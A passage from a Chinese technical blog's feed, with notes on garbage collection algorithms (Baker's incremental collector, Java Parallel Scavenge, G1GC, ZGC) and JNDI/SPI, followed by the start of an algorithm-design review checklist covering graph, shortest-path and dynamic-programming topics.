children；</li></ul><p>算法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">procedure tricolor-marking:</span><br><span class="line">set root object gray // visit</span><br><span class="line"></span><br><span class="line">while they are any gray objects:</span><br><span class="line">    select a gray record p</span><br><span class="line">    for each field fi of p:</span><br><span class="line">        if fi.p is white:</span><br><span class="line">            color fi.p gray// visit first time (可以用栈压入来实现)</span><br><span class="line">    color record p black// visit second time (可以用栈弹出来实现)</span><br></pre></td></tr></table></figure><blockquote><p>这里是 BFS 性质的遍历所以使用栈数据结构。可以类比，Copy Collection 中的 Cheney’s Algorithm，可以使用队列数据结构来实现；</p></blockquote><p>这里注意几个<strong><u>算法不变量</u>（Invariants）</strong>，它们是构建 Incremental Collection 的根本原理：</p><ul><li>不存在黑结点直接指向白结点的情况。如果有就说明黑色结点对应的对象并没有处理完全，出现了数据不一致的问题；</li><li>灰结点一定在 collector 的数据结构（fringe）中，意味着正在处理；</li></ul><p>现在，我们希望在 tricolor marking 的基础上引入 incremental collection，就意味着，被分配的 object 在 GC 结束后继续留有标记，交给 mutator 执行。</p><p>过一段时间后，再次进入 GC 执行算法时，可能就会出现上述算法不变量的违反。</p><p>例如，已经染黑的结点（GC 完全扫描的结点）在上一轮 GC 结束后，被 mutator 追加了白色结点（上一轮 GC 结束后才分配的），这个时候就违反了第一个 invariant。</p><p>于是！所谓的 incremental collection 做增量回收，就是通过在 runtime 分配堆空间时，采取措施保证 invariants 的成立（在 mutator 运行时，而非 collector 运行时），对变化的部分进行 GC 检查。</p><p>基本的思路还是，针对基本的读写操作进行打桩（barriers）：</p><ul><li><p>Method 1 (Dijkstra, Lamport)：向黑结点 object 写入指针 field （插入白结点）时染灰（纳入 GC 管理中）；</p></li><li><p>Method 2 (Steele)：向黑结点 object 写入指针 field （插入白结点）时将父黑结点染灰（dirty，让之前的结点重新放入 GC fringe、表示需要重新扫描）；</p><p>(Boehm, Demers, Shenker) 改进是把 black 结点的页改成 write-protected，page fault handler 更改权限为 writable，并且标记为灰色（但这么做也有性能问题）；</p></li><li><p>Method 3 (Baker)：在读<u>灰结点</u> object 的白子结点时提前将该白结点染灰（纳入 GC 管理），这样 mutator 永远无法获得一个不受 GC 管理的指针了！因此就不会出现 invariant 的违反问题；</p><p>(Appel, Ellis, Li) 改进还是利用 page fault，但这个时候直接从灰结点开始进行一次 GC，染成黑色-灰色的结点；</p></li></ul><p>于是，我们基于 Copy Collection 的 Cheney’s Algorithm 实现一个 Incremental Collection 算法 (read)：<strong><u>Baker’s Algorithm</u></strong>；</p><p>基本前提：应用（mutator）和 GC（collector）处于同一线程中；</p><p>定时策略：仅 allocate memory 时交互进行；</p><p><img src="imgs/gc-baker-algo.png" width="250px" /></p><p>仍然把 heap 分为 from-space 和 to-space 两个部分；</p><p>GC 过程仍然从堆内存满了后开始，但不是一次性做完，而是每次 allocation 时增量地做一点；步骤如下：</p><ol><li><p>当堆（from-space）满后，交换二者角色，现在 from-space 变成空的一边；并且立即 forward root 结点到 from-space；</p><p><img src="imgs/gc-baker-flip.png" width="250px" /></p></li><li><p>第一步结束后，不继续复制，而是先退出 GC 例程，回到应用（有点像协程 coroutine）；当应用在 GC 例程暂停期间 allocate 堆时，会再次唤醒 GC，此时：</p><ul><li><p>会直接分配在空的 from-space 的末端（减小 limit 的指针位置）；</p><p><img src="imgs/gc-baker-alloc.png" width="250px" /></p></li><li><p>对应的扫描并从 to-space 中复制已分配记录（注意，如果分配了 N bytes 空间，那么从 to-space 扫描的大小不小于 N bytes，为了 copy 的过程不慢于应用分配的速度）。注意 forwarding pointers；</p><p><img src="imgs/gc-baker-incr-scan.png" width="250px" /></p></li></ul></li><li><p>第一步结束后，如果应用在 GC 例程暂停期间 load references，创建了指向 to-space entry（这个 entry 是没有被复制到 from-space 过的）的 root 结点，那么根据 tricolor marking 理论，此时 to-space 中未被复制到 from-space 的 entries 全是白结点（没有被 GC 遍历过），这相当于直接将黑结点指向白结点（违反 invariant 1）。我们立即做一次 forward（但不关心它内部的 forwarding pointers）：</p><p><img src="imgs/gc-baker-load1.png" width="550px" /></p><p>如果指向的 to-space entry 是已被复制的，那么立即 forward：</p><p><img src="imgs/gc-baker-load2.png" width="550px"/></p></li><li><p>当 <code>scan</code> 碰上 <code>next</code> 时，allocation 结束，本轮 GC 再次暂停，控制权又回到应用；</p><p>只要保证 $R\lt\dfrac{1}{4}H$，在上述过程中就不会出现 GC 扫描时 from-space 用完的情况；</p></li></ol><p>总结一下 incremental collection 的优缺点：</p><ul><li>优点：时延低，把复制的操作均摊到每次 allocation 时，减小了单次的 STW 时长，对 real-time app（例如浏览器/端侧设备渲染、游戏应用等等）友好；</li><li>缺点：总体开销很大，每次 read 都多两条指令（compare &amp; jump）；性能开销高出 20%（而且还没有考虑 locality）；</li></ul><h2 id="8-7-Concurrent-Collection"><a href="#8-7-Concurrent-Collection" class="headerlink" title="8.7 Concurrent Collection"></a>8.7 Concurrent Collection</h2><p>之前我们讨论的是同步 GC，有没有异步 GC 呢？有的。就像前面说的，无论如何都需要 STW 来同步信息，只不过 STW 的长短罢了。在并行 GC 中，STW 的大部分工作都在 synchronization 中；</p><p>这里全部展开的话篇幅过长，我们按下不表，在后面讨论 Java 的并行 GC 的算法时再作介绍。</p><h2 id="8-8-Parallel-Scanvenge-Java"><a href="#8-8-Parallel-Scanvenge-Java" class="headerlink" title="8.8 Parallel Scanvenge (Java)"></a>8.8 Parallel Scanvenge (Java)</h2><p>一个内存密集型设计比较成功的语言。因此 Java 的 GC 设计的比较成熟。</p><p>2010 年左右的时间，Java 8 默认使用的是 <strong><u>Parallel Scavenge (PS)</u></strong> 这种 GC 策略。</p><p>定时策略：某个 semi-space 满了后；</p><p>它其实也是一种 Generation GC 的策略（stop-copy-compact，也有 STW 存在）。不过 Parallel Scavenge 对于新代和旧代的 GC 算法是不同的。总体结构如下：</p><p><img src="imgs/gc-modern-java-arch.png" width="350px" /></p><p>注意到，Young Generation（新代）中存在 3 个 semi space:   Eden、From、To，使用 Minor GC 算法如下：</p><ol><li>Application allocate 空间时向 Eden 区域直接插入；</li><li>Eden-space 满了后，从 root 遍历复制 reachable records 到 to-space；</li><li>当 Eden-space 再次满了/ to-space 满了后，同时从 root 遍历复制 reachable records 到 from-space；<ul><li>其中在 to-space 中存活 <code>K</code> 轮的 records，会被 promote 到 old generation(s) 中；</li></ul></li><li>在一轮复制结束后，如果 from-space 快满了，则交换 to-space 和 from-space 的身份；</li></ol><p><img src="imgs/gc-java-minor.png" /></p><p>Minor GC 如何并行与 Application 执行（parallel execution）？</p><ul><li>Reference Tracking；</li><li>Copy Race（Queue &amp; CAS）；</li><li>Work Stealing；</li></ul><p>对于旧代（Old Generation）使用 Full/Major GC 算法：</p><blockquote><p>一般要执行 Full GC，那么这时可能剩余内存已经不多了。</p></blockquote><ul><li><p>Marking:   Mark all live objects;</p></li><li><p>Summary:   Calculate new address for live objects;</p><blockquote><p>先算出地址，而不是上来就 copy，方便后面的 compaction；</p></blockquote></li><li><p>Compact:   Move objects and update references;</p><blockquote><p>需要考虑一个问题，如果 destination 也是 source 呢？</p></blockquote></li></ul><p><img src="imgs/gc-java-major.png"/></p><p>PS 这种策略也有些缺陷，例如空间是连续的（难以 split/adjust/reorganize），并且比例固定（在 VM 启动后固定）：</p><p>而且 Minor GC（4 GB ~）一般在 100ms 左右，Major GC （16 GB ~）一般多于 1s。</p><p>为了改进这个问题，我们可以：</p><ul><li><p>将 heap 的结构从 space 改成 regions（分块，smaller, segregated regions）：</p></li><li><p>Also including young and old spaces:   Adding a middleground between old and young，这被称为 <strong><u>Mixed GC</u></strong>；</p><p><img src="imgs/gc-java-mixed.png" width="350px" /></p></li><li><p>Collection set: including all regions to be collected；</p><p><img src="imgs/gc-java-collection-set.png" width="250px" /></p></li></ul><p>当然，Parallel Scanvenge 有很强的特点，就是它是吞吐量垃圾收集器（Throughput Collector），它的设计目标是最大化应用程序的吞吐量。也就是说它适用于<strong><u>对吞吐量要求较高</u></strong>的应用程序，例如适合批处理任务或后台处理任务。</p><h2 id="8-9-G1GC-Java"><a href="#8-9-G1GC-Java" class="headerlink" title="8.9 G1GC (Java)"></a>8.9 G1GC (Java)</h2><p>Garbage First GC（G1GC）主要也是采用了 Generation GC 的思想，不过具体细节有些改动。</p><p>它将 Heap 分成 3 个部分，有点类似之前的 Parallel Scanvenge + Mixed GC 改进 + Collection Set 改进：</p><ul><li><strong>Eden:</strong> This is where newly created objects are allocated.</li><li><strong>Survivor:</strong> There are typically two Survivor regions (S0 and S1), and they are used to  hold objects that have survived one or more garbage collection cycles.</li><li><strong>Old Generation:</strong> This region is used to hold long-lived objects that have survived multiple garbage collection cycles.</li></ul><p>这里这篇文章描述的比较好，可以看看：<a href="https://medium.com/@perspectivementor/how-g1-garbage-collector-work-in-java-e468a94ebed6">How G1GC Work in Java</a>；</p><p>算法则主要分为 3 个阶段：</p><ul><li>标记阶段，即从 Roots References 开始，标记活跃对象；<ul><li>此阶段一开始寻找 root 时需要 STW，不过因为数量很少，因此时间较短；</li><li>然后需要遍历 reachable graph，此时是 concurrent mark，因此不需要 STW；</li></ul></li><li>转移阶段，即把活跃对象复制到新的内存地址上；</li><li>重定位阶段，因为转移导致对象的地址发生了变化，在重定位阶段，所有指向对象旧地址的指针都要调整到对象新的地址上。</li></ul><p>这里我们重点关注 G1GC 针对 Young GC 和 Mixed GC 的算法上，其主要流程如下：</p><p><img src="imgs/gc-java-g1gc.png" width="550px" /></p><p>此外，除了 Mixed GC 调整年轻代和年老代的回收阈值、heap 的分区收集结构，以及更强的并发能力以外，G1GC 还提供了<strong>预测性暂停时间</strong> 的特性，可以通过设置目标暂停时间（Pause Time Goal）来控制垃圾收集的暂停时间。</p><p>最后，G1GC 是<u>为多核处理器和大内存系统设计的</u>，旨在替代 CMS（Concurrent Mark-Sweep，注意到历史原因）的并发垃圾收集器（也是 Concurrent GC 的一种）。</p><h2 id="8-10-ZGC-Java"><a href="#8-10-ZGC-Java" class="headerlink" title="8.10 ZGC (Java)"></a>8.10 ZGC (Java)</h2><p>这是 Java 中的一个更新的 GC 机制。它在 Java 11 中实验性使用，在 Java 15 及以后可以正式作为生产环境的一种选择了。</p><p>ZGC 致力于提供尽可能短的 STW 时间。它的目标是：</p><ul><li>STW 时间不超过 10 ms；</li><li>STW 时间不会随着堆的大小，或者活跃对象的大小而增加；</li><li>支持 8 MB~4 TB 级别的堆（未来支持 16 TB）。</li></ul><p>这主要是想匹配服务器应用程序的使用场景。因为在服务器应用程序中，大堆很常见（通常程序运行时间更长、运行的守护进程更多），而且需要快速的应用程序响应时间。</p><p>ZGC 有两种算法，一种是 Generational 的（分代），这个和前面 G1GC 以及 Parallel Scanvenge 比较相似，能够利用到分代的好处（吞吐量上升和更低的时延）；也有一种是 non-generational 的，主要是考虑到禁用分代后可以对某些使用场景进行运行时性能优化。这里我们为了简便，就讨论 non-generational 的实现。下面我们将不分代的 ZGC 单独称为 “ZGC”；</p><p>与 G1GC 的 Mixed GC 和 Young GC 类似，ZGC 也是采用标记然后复制的算法，不过 ZGC 对这部分的算法做了重大改进：ZGC 在标记、转移和重定位阶段几乎都是并发的。ZGC 垃圾回收周期如下图所示：</p><p><img src="imgs/gc-java-zgc.png" width="550px" /></p><p>注意到 “初始标记” 就是我们在 G1GC 中讨论的，标记 root references，需要 STW、不能并发，不过时间很短。</p><h3 id="Tricky-Things"><a href="#Tricky-Things" class="headerlink" title="Tricky Things"></a>Tricky Things</h3><p>ZGC通过着色指针和读屏障技术，解决了转移过程中准确访问对象的问题，实现了并发转移。大致原理描述如下：并发转移中“并发”意味着GC线程在转移对象的过程中，应用线程也在不停地访问对象。假设对象发生转移，但对象地址未及时更新，那么应用线程可能访问到旧地址，从而造成错误。而在ZGC中，应用线程访问对象将触发“读屏障”，如果发现对象被移动了，那么“读屏障”会把读出来的指针更新到对象的新地址上，这样应用线程始终访问的都是对象的新地址。那么，JVM是如何判断对象被移动过呢？就是利用对象引用的地址，即着色指针。下面介绍着色指针和读屏障技术细节。</p><h4 id="References-Coloring"><a href="#References-Coloring" class="headerlink" title="References Coloring"></a>References Coloring</h4><blockquote><p>着色指针是一种将信息存储在指针中的技术。</p></blockquote><p>ZGC 仅支持 64 位系统，它把 64 位虚拟地址空间划分为多个子空间，如下图所示：</p><p><img src="imgs/gc-java-zgc-area.png" width="550px" /></p><p>其中，<code>[0~4TB)</code> 对应 Java 堆，<code>[4TB ~ 8TB)</code> 称为 <code>M0</code> 地址空间，<code>[8TB ~ 12TB)</code> 称为 <code>M1</code> 地址空间，<code>[12TB ~ 16TB)</code> 预留未使用，<code>[16TB ~ 20TB)</code> 称为 <code>Remapped</code> 空间。</p><p>当应用程序创建对象时，首先在堆空间申请一个虚拟地址，但该虚拟地址并不会映射到真正的物理地址。ZGC 同时会为该对象在 M0、M1 和 Remapped 地址空间分别申请一个虚拟地址，且这三个虚拟地址对应同一个物理地址，但这三个空间在同一时间有且只有一个空间有效。ZGC 之所以设置三个虚拟地址空间，是因为它使用“空间换时间”思想，去降低 GC 停顿时间。“空间换时间”中的空间是虚拟空间，而不是真正的物理空间。后续章节将详细介绍这三个空间的切换过程。</p><p>与上述地址空间划分相对应，ZGC 实际仅使用 64 位地址空间的第 0~41 位，而第 42~45 位存储元数据，第 47~63 位固定为 0。</p><p><img src="imgs/gc-java-zgc-pointer.png" width="550px" /></p><p>ZGC 将对象存活信息存储在 42~45 位中，这与传统的垃圾回收（例如 Reference Count）并将对象存活信息放在对象头中的策略是不相同的。</p><h4 id="Load-Barriers"><a href="#Load-Barriers" class="headerlink" title="Load Barriers"></a>Load Barriers</h4><blockquote><p>读屏障是 JVM 向应用代码插入一小段代码的技术。当应用线程从堆中读取对象引用时，就会执行这段代码。需要注意的是，仅“从堆中读取对象引用”才会触发这段代码。</p></blockquote><p>读屏障示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> obj.FieldA;    <span class="comment">// 从堆中读取引用，需要加入屏障</span></span><br><span class="line">&lt;Load barrier&gt;</span><br><span class="line"><span class="type">Object</span> <span class="variable">p</span> <span class="operator">=</span> o;            <span class="comment">// 无需加入屏障，因为不是从堆中读取引用</span></span><br><span class="line">o.dosomething();        <span class="comment">// 无需加入屏障，因为不是从堆中读取引用</span></span><br><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span>  obj.FieldB;    <span class="comment">//无需加入屏障，因为不是对象引用</span></span><br></pre></td></tr></table></figure><p>ZGC 中读屏障的代码作用：在对象标记和转移过程中，用于确定对象的引用地址是否满足条件，并作出相应动作。</p><h2 id="8-11-Summary"><a href="#8-11-Summary" class="headerlink" title="8.11 Summary"></a>8.11 Summary</h2><p>总的来说，虽然垃圾收集器的技术在不断进步，但直到现在还没有最好的收集器出现，因为不存在“万能”的收集器，<u>只有适合某些使用场景的垃圾回收器</u>。</p><h1 id="Chapter-9-JDNI-amp-SPI"><a href="#Chapter-9-JDNI-amp-SPI" class="headerlink" title="Chapter 9. JDNI &amp; SPI"></a>Chapter 9. JDNI &amp; SPI</h1><p>Java Oracle Doc 一目了然：</p><p>Java Naming and Directory Interface (JNDI) 是一个应用程序编程接口 (API)，为使用 Java 编程语言编写的应用程序提供命名和目录功能。它的定义独立于任何特定的目录服务实现。因此，各种目录，无论新的、正在出现的和已经部署的，都可以用一种通用的方式访问。</p><p>而 JNDI 体系结构包括一个 API 和一个服务提供商接口 (SPI)。Java 应用程序使用 JNDI API 访问各种命名和目录服务。SPI 使各种命名和目录服务能以透明方式插入，从而允许使用 JNDI API 的 Java 应用程序访问它们的服务。</p><p><img src="imgs/jndi-arch.gif" /></p><p>补充：什么是 SPI？</p><p>SPI 即 Service Provider Interface ，字面意思就是：“服务提供者的接口”，我的理解是：专门提供给服务提供者或者扩展框架功能的开发者去使用的一个接口。</p><p>SPI 将服务接口和具体的服务实现分离开来，将服务调用方和服务实现者解耦，能够提升程序的扩展性、可维护性。修改或者替换服务实现并不需要修改调用方。</p><p>SPI 和 API 有什么区别吗？下面一个图就能弄清楚：</p><p><img src="imgs/spi-vs-api.png" width="350px" /></p><ul><li>当实现方提供了接口和实现，我们可以通过调用实现方的接口从而拥有实现方给我们提供的能力，这就是 <strong>API</strong>。这种情况下，接口和实现都是放在实现方的包中。调用方通过接口调用实现方的功能，而不需要关心具体的实现细节。</li><li>当接口存在于调用方这边时，这就是 <strong>SPI</strong> 。由接口调用方确定接口规则，然后由不同的厂商根据这个规则对这个接口进行实现，从而提供服务。</li></ul><p>补充：SPI 出现的原因是？</p><p>面向对象设计鼓励模块间基于接口而非具体实现编程，以降低模块间的耦合，遵循依赖倒置原则，并支持开闭原则（对扩展开放，对修改封闭）。然而，直接依赖具体实现会导致在替换实现时需要修改代码，违背了开闭原则。为了解决这个问题，SPI 应运而生，它提供了一种服务发现机制，允许在程序外部动态指定具体实现。这与控制反转（IoC）的思想相似，将组件装配的控制权移交给了程序之外（IoC 比较著名的例子就是 Spring Framework）。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Chapter-7-Java-Concurrent&quot;&gt;&lt;a href=&quot;#Chapter-7-Java-Concurrent&quot; class=&quot;headerlink&quot; title=&quot;Chapter 7. Java Concurrent&quot;&gt;&lt;/a&gt;Chapter 7.</summary>
      
    
    
    
    <category term="technical" scheme="https://blog.sjtuxhw.top/categories/technical/"/>
    
    
    <category term="Programming" scheme="https://blog.sjtuxhw.top/tags/Programming/"/>
    
    <category term="Java" scheme="https://blog.sjtuxhw.top/tags/Java/"/>
    
    <category term="GC" scheme="https://blog.sjtuxhw.top/tags/GC/"/>
    
    <category term="Concurrent" scheme="https://blog.sjtuxhw.top/tags/Concurrent/"/>
    
  </entry>
  
  <entry>
    <title>算法设计知识点自查表</title>
    <link href="https://blog.sjtuxhw.top/review/algo-desgin-table/"/>
    <id>https://blog.sjtuxhw.top/review/algo-desgin-table/</id>
    <published>2024-12-31T14:47:03.000Z</published>
    <updated>2025-01-18T15:03:36.201Z</updated>
    
    <content type="html"><![CDATA[<ol><li><p>四则运算、$\mathbf{Z}_N$ 下四则运算+幂运算复杂度；</p></li><li><p>欧几里得 GCD 递归复杂度证明；</p></li><li><p>拓展欧几里得算法求乘法逆元；</p></li><li><p>利用同余性质推算大数能否被整除；</p></li><li><p>费马小定理完整证明；</p></li><li><p>非 Carmichael 合数的费马测试证明；</p></li><li><p>对称加密、非对称加密、证书；</p></li><li><p>大师定理；</p></li><li><p>比较排序的时间下界证明（$n!$ 如何确定两边界？）；</p></li><li><p>快选算法在 25%-75% 判据下的时间复杂度；</p></li><li><p>矩阵算法、计数逆序（及拓展）时间复杂度推导、算法设计；</p></li><li><p>有向图中，有自环等价于存在回边的证明；</p></li><li><p>DAG 中，最大 post number 意味着源点、最小 post number 意味着汇点；</p><blockquote><p>证明 DAG 中，至少有一个源点和一个汇点；</p></blockquote></li><li><p>普通有向图中，最大 post number 意味着位于源点强连通部件内。但最小 post number 没有特性；</p></li><li><p>记忆：任何有向图的嵌图都是 DAG；</p></li><li><p>$G$ 中的源点强连通部件是 $G^R$ 中的汇点强连通部件；</p></li><li><p>证明：</p><ul><li><p>DFS explore 子过程若从 $u$ 开始，必然以 $u$ 及其所有可达结点遍历结束后结束（反证）；</p></li><li><p>$G$ 的两个不同的强连通部件 $C_1,C_2$，如果有从 $C_1$ 到 $C_2$ 的边，则 $C_1$ 的最大 post number 大于 $C_2$ 的最大 post number（不是所有），证明时讨论遍历开始的位置；</p></li><li>同第 14 条；</li></ul></li><li><p>线性时间查找有向图强连通部件算法；</p></li><li><p>问题：</p><ul><li>线性时间找到有向图中能到达其他所有顶点的点（如果不存在需要指出）；</li><li>线性时间判断无向图是否为二部图：证明使用着色法；</li><li>线性时间判断有向图是否存在奇数个顶点的环：<strong><u>每个强连通子图</u></strong>上 DFS 二染色。对回边（好理解）/ 前向边 / 交叉边（如果强连通部件中从 $u$ 到 $v$ 间有两条道路，并且这两条道路奇偶数不同，因为违反染色规则了所以不同。则必然存在一个奇数环和一个偶数环）违反规则的情况认为是含有奇数顶点的环；</li><li>线性时间找 DAG 中从指定顶点 $u$ 到 $v$ 的路径数目：从 $u$ DFS 遍历时，遇到无论什么边，只要是指向 $v$ 的，都让计数加一；</li><li>线性时间判断 DAG 中的 Hamilton 路径的存在性：修改线序化算法。每次检查是否有多于一个入度为 0 的结点，如果是就不存在。</li></ul></li><li><p>lemma：BFS 过程中，<strong>对每个 $d\in\mathbf{N}$，都总存在一个时刻，使得</strong>：</p><ul><li>所有与 $s$ 间距小于等于 $d$ 的顶点都被<strong><u>正确地</u></strong>设置了距离；</li><li>其他顶点的距离都还未被设置（$+\infty$）;</li><li>队列中只含有与 $s$ 间距为 $d$ 的顶点；</li></ul></li><li><p>分析 d-堆、二叉堆、数组作为 Dijkstra 算法的优先级队列时的时间复杂度情况；</p></li><li><p>Dijkstra 算法：</p><ul><li>所有结点初始化距离为 $\infty$，只有源点是 0；然后对所有结点构建优先级队列；</li><li>在队列不空时循环出队：<ul><li>出队 $u$ 时，更新相邻结点距离。如果更小就覆盖（此举会改变相邻点在优先级队列中的位置），并且维护最短路径列表 <code>pre[]</code>（如果需要）；</li></ul></li></ul><p>时间复杂度：$|V|$ 次删除、$|V|+|E|$ 次 <code>decreaseKey</code>；</p></li><li><p>证明 Dijkstra 算法正确性：归纳假设</p><p><img src="imgs/dijkstra-proof.png" width="250px" /></p><ul><li><p>预设：对于一个图 $G$，设定源点 $s$，希望测量的目标点 $v$，假定算法运行时已经设定距离（完整更新一轮邻居后的结果）的结点的集合为 $S$。下面对 $S$ 的大小与算法正确性归纳；</p></li><li><p>奠基：$|S|=1$ 的情况显然算法正确（$s$ 的最短距为 0）；</p></li><li><p>假设：假设对于 $|S|\ge1$ 的情况算法都是正确的；</p></li><li><p>归纳：进行下一轮邻居更新时，设更新到的结点 $v$ 将被加入 $S$，设 $(u,v)$ 是最后一条边。则 $s$ 至 $u$ 的最短路径一定位于 $S$ 中（算法正确性保证），记为 $dist[u]$，我们只需要证明 $dist[u]+l(u,v)$ 比其他任何 $s$ 到 $v$ 间的路径都短就行。</p><ul><li><p>假设 $(x,y)$ 是新一轮迭代中第一条边（最有可能更短），并且 $y$ 到 $v$ 右边。我们记 $s$ 到 $x$ 的路径为 $p^\prime$，则：</p><p>$l(p^\prime)+l(x,y)\ge dist[u]+l(x,y)\ge dist[y]\ge dist[v]$；</p><blockquote><p>注意到，如果存在负边权，$dist[y]\ge dist[v]$ 不再成立，因为可能 $l(y,v)$ 是个绝对值很大的负数。</p><p>这个时候如果需要更新 $v$，发现 $v$ 已经被弹出去了，没法更新了，因此 Dijkstra 算法在负权下不再是正确的了。</p></blockquote></li></ul></li></ul></li><li><p>Bellman-Ford 算法：</p><ul><li>从源点开始，<u>同时地更新一次</u>（不能把这轮更新的信息用来更新其他结点）每条边的两端点的距离信息；</li><li>重复上述动作 $|V|-1$ 次；</li></ul><p>时间复杂度 $O(|V||E|)$；</p></li><li><p>证明为何 Bellman-Ford 算法只需要重复更新 $|V|-1$ 次：</p><ul><li>因为从源点 $s$ 到任意一点 $t$ 的最短路径 $s\rightarrow v_1\rightarrow v_2\rightarrow\cdots\rightarrow v_k\rightarrow t$ 最多包含了 $|V|-1$ 个顶点（这条用反证法）。</li><li>更新了 $|V|-1$ 次后，即便再多的更新都是安全的（$\min$ 不会变大），并且不会缺漏（顶点不会移除）；</li></ul></li><li><p>如何检测负环？让 Bellman-Ford 算法在运行 $|V|-1$ 次后再进行一次，如果还有顶点的距离在变化，则说明有负环。</p></li><li><p>可以含负权的 DAGs 的单元最短路径算法：先拓扑排序，再按线序顺序更新结点的距离信息；</p><p>时间复杂度：$O(|V|)$；</p></li><li><p>问题：</p><ul><li><p>强连通图的某点 $v_0$ 通过的边全部是正权的。找任意两点间的最短路，要求必须经过 $v_0$；</p><blockquote><p>先求 $v_0$ 为源的到各点的最短距离，然后 $dist(u,v_0)+dist(v_0,v)$；</p></blockquote></li><li><p>无向正权图中有一条边 $e_0$，求含 $e_0$ 的最短环的长度；</p><blockquote><p>设 $e_0=(u,v)$，在 $G-e_0$ 中执行 Dijkstra 算法找到 $u$ 到 $v$ 的最短距离，加上 $l(e_0)$ 即可；</p></blockquote></li><li><p>有向正权图的最短环？</p><blockquote><p>环是由 $u$ 到 $v$ 和 $v$ 到 $u$ 的路径拼接而成。</p><p>先求每两个点间的最短路径（数组数据结构 $O(|V|^3)$），在遍历查找 $dist(u,v)+dist(v,u)$ 最小值；</p></blockquote></li><li><p>有向正权图中最简最长路径？</p><blockquote><p>NP Hard 问题；可以将 Hamilton 图问题规约到这个问题。</p></blockquote></li><li><p>无向正权图的最短环？</p><blockquote><p>遍历所有边，每轮循环时删除当前边，并且选取一端运行 Dijkstra 算法。如果另一端是可达的（不是 $\infty$，记为 $c_i$），那么说明原图中存在一个长度为 $c_i+l(e)$ 的环。遍历找长度最小的那个。</p></blockquote></li><li><p>无向等权图中指定两点间最短路径数量？</p><blockquote><p>BFS 使用两个队列。类似 copy collection，最终在队列 1 中找到与 $u$ 相邻的结点终止。然后统计队列中还有哪些与 $u$ 相邻的结点。其数量即为所求。</p><p>这个方法的原理是利用 BFS 的性质（参见第 20 条 lemma）：在每轮结束后队列中放的是相同长度的结点（分开放能确保下一轮的结点不会混入当前队列中）。</p></blockquote></li></ul></li><li><p>证明 $|V|-1=|E|$ 的<u>无向连通图</u>等价于树数据结构；</p><ul><li><p>必要性：归纳。对顶点归纳的话，就是 $k$ 个顶点推 $k+1$ 个；对边归纳的话，就是向 $n$ 个顶点中加边看连通部件数是否减为 1；</p></li><li><p>充分性：反证。假设不是树，则必然存在环，重复去环得到 $|E^\prime|\lt|E|$，由必要性可知 $|E^\prime|=|V|-1=|E|$，矛盾；</p></li></ul></li><li><p>证明一个无向图是一棵树 当且仅当 任意两结点间有一条唯一路径；</p><ul><li>充分性：反证。如果不是就有环，违反定义；</li><li>必要性：先判断是连通图，再反证。假设存在环，则存在两个结点间路径不唯一，矛盾；</li></ul></li><li><p>Kruskal：向顶点中加尽可能小的边，成环就舍去。直至加够 $|V|-1$ 条；</p></li><li><p>割定理：割集间的最短边一定在最小生成树中：分类讨论 + 反证法；</p></li><li><p>Prim：顶点割集 + 顶点的策略。正确性由割定理保证；</p></li><li><p>上色算法求 MST：破圈（染红没有红边的环）、闭圈（染蓝没有蓝边的割边集合中最短边）；</p></li><li><p>证明贪婪算法作为近似算法求解 set cover 问题的近似比为 $\ln n$（设 $n_t$ 是 $t$ 轮选取后剩下的顶点数）；</p></li><li><p>01 背包和完全背包问题的状态转移方程、边界条件（出口）、时空复杂度；</p></li><li><p>多重背包问题（不含二进制优化）算法设计以及时间复杂度分析；</p></li><li><p>硬币找零问题最优解算法；</p></li><li><p>子序列系列问题：</p><ul><li>最长递增子序列：构造 DAG 再动归边；</li><li>最长公共子序列、最长公共子串；</li><li>分治法和动态规划分别求解 最大连续子序列（即子串）和（为什么讨论以 $a_i$ 结尾的子串？子串更适合这种方法！）；</li></ul></li><li><p>三分问题的状态转移方程；</p></li><li><p>Shortest Reliable Path Lite：经过不超过指定边数的最短路径问题；</p><blockquote><p>和 Shortest Reliable Path 的 NP-Complete 问题不一样；</p><p>详情参见第 50 条；</p></blockquote></li><li><p>矩阵乘法最优分配：化归为二叉树，动归二叉树代价；</p></li><li><p>动态规划尝试解决 TSP 问题算法；</p></li><li><p>线性时间找出树的 independent set 大小：分类讨论，孙子结点可以在、儿子结点只能替代；</p></li><li><p>棋子放置问题：模式、相容 与动态规划；</p></li><li><p>DP 难题：</p><p><img src="imgs/dp-nb.png" /></p><p>假设 $M[i,j,p,q]$ 表示对子串 $s[i]\sim s[j]$ 分割，涉及分割点在数组中 $d[p]\sim d[q]$，分割后的最小代价；</p><p>状态转移方程：$M[i,j,p,q]=j-i+1+\min\limits_{p\le k\le q}\{M[i,d[k],p,k]+M[d[k]+1,j,k+1,q]\}$；</p><p>算法复杂度 $O(m^2n^2)$；</p><p><img src="imgs/dp-nb2.png" /></p><p>设在 $x\times y$ 的布料上制作前 $i$ 个产品的最大价值为 $P(i,x,y)$，则状态转移方程为：</p><script type="math/tex; mode=display">\left\{\begin{aligned}P_h(i,x,y)&=\max\{P(i-1,x,y),c_i+P(i,x-a_i,y)+P(i,x,y-b_i)+P(i,x-a_i,y-b_i)\}\\P_v(i,x,y)&=\max\{P(i-1,x,y),c_i+P(i,x-b_i,y)+P(i,x,y-a_i)+P(u,x-b_i,y-a_i)\}\\P(i,x,y)&=\max\{P_h(i,x,y),P_v(i,x,y)\}\end{aligned}\right.</script><p>主要注意到布料是可以旋转使用的！因此分为旋转后再裁剪（$P_v$）和不旋转直接裁剪（$P_h$）两种手段。</p></li><li><p>规范型线性规划转对偶式；</p></li><li><p>单纯形算法时间复杂度推导 